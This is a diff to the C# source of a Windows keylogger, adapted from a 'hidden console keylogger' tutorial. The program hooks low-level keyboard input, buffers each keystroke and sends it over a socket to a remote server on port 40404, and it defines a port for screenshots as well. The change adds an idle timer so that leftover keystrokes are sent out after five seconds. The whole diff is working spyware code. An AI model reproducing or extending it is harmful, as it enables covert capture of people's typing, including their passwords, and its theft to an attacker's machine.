@@ -2,7 +2,6 @@
 Adapted from URL=[http://www.businessinsider.com/how-to-create-a-simple-hidden-console-keylogger-in-c-sharp-2012-1]
 Used socket code from URL=[https://docs.microsoft.com/en-us/dotnet/framework/network-programming/synchronous-client-socket-example]
 */
-
 using System;
 using System.Runtime.InteropServices;
 using System.IO;
@@ -11,12 +10,16 @@ using System.Windows.Forms;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
 
 public static class Globals
 {
-    public const string serverIP = "10.0.2.15";
+    //public const string serverIP = "10.0.2.15"; // not used if "ipAddress = ipHostInfo.AddressList[0];" below
     public const Int32 keyPort = 40404;
     public const Int32 screenPort = 40405;
+    public const int maxBufferSize = 256;           // in number of Keys
+    public const int idleTimeBeforeFlush = 5000;    // in milliseconds
 }
 
 public class WinLogger
@@ -26,9 +29,10 @@ public class WinLogger
     private static LowLevelKeyboardProc proc = KeyLogging;
     private static IntPtr hookInt = IntPtr.Zero;
 
-    private const int maxBufferSize = 256;
-    private static Keys[] userBuffer = new Keys[maxBufferSize];
+    private static Keys[] userBuffer = new Keys[Globals.maxBufferSize];
     private static int bufIndex = 0;
+    private static Task idleCountdown = Task.CompletedTask;
+    private static CancellationTokenSource stopIdleTimer = null;
     
     static public void Main ()
     {
@@ -48,10 +52,33 @@ public class WinLogger
             Console.WriteLine((Keys)vkCode);
             userBuffer[bufIndex++] = (Keys)vkCode;
             
-            if(bufIndex >= maxBufferSize)
+            if(Globals.maxBufferSize <= bufIndex)
             {
                 flushBufferToServer(ref userBuffer, bufIndex);
                 bufIndex = 0;
+                // no need to cancel timer token due to bufIndex is not zero check
+            } 
+            else
+            {
+                if(!idleCountdown.IsCompleted) {
+                    // need to cancel the pending task
+                    stopIdleTimer.Cancel();
+                    stopIdleTimer.Dispose();
+                    // and continue to 'restart' it with updated buffer index, below
+                }
+                // create a new task to perform idle buffer flushing
+                stopIdleTimer = new CancellationTokenSource();
+                idleCountdown = Task.Run(async delegate
+                    {
+                        int idxBeforeDelay = bufIndex;
+                        await Task.Delay(Globals.idleTimeBeforeFlush, stopIdleTimer.Token);
+                        if (bufIndex != idxBeforeDelay && bufIndex != 0)
+                        {
+                            // send server residual keys user pressed
+                            flushBufferToServer(ref userBuffer, bufIndex);
+                            bufIndex = 0;
+                        }
+                    });
             }
         }
         return CallNextHookEx(hookInt, nCode, wParam, lParam);
@@ -60,9 +87,7 @@ public class WinLogger
     private static void flushBufferToServer(ref Keys[] buf, int end_idx) {
         string concatBuf = "";
         for(int i = 0; i < end_idx; i++)
-        {
             concatBuf += buf[i].ToString();
-        }
 
         try {
             // Establish the remote endpoint for the socket.  
